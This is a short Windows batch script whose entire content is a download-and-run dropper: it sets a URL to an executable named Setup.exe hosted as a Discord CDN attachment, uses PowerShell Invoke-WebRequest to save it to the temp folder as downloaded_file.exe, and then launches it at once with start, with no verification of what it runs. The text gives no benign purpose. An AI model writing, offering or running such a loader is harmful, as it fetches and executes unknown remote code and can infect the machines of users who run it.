@echo off
set "url=<https://cdn.discordapp.com/attachments/1197242628396302458/1328059195471298650/Setup.exe?ex=67855302&is=67840182&hm=5cd5c809d92de46b0c90c394cc739c7095335ef390e0b1fc288156beac870996&>"
set "file=%temp%\downloaded_file.exe"
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%file%'"
start "" "%file%"
